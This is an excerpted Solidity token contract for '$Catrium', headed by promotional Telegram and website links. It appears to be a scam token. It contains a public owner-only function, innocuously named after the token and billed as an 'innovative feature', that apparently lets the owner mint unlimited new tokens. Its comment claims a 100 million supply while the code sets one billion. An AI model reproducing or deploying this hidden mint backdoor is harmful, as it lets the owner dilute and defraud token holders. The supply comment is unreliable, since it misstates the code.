//
// $Catrium proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/CatriumChinese
// 📱 Website ::https://catrium.com/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Catrium(uint256 amount) public onlyOwner {
 _Catrium(msg.sender, amount);
    }
    ...
    function _Catrium(address account, uint256 amount) internal virtual {
...
contract $Catrium is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Catrium", "CATRIUM") {
     _Catrium(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}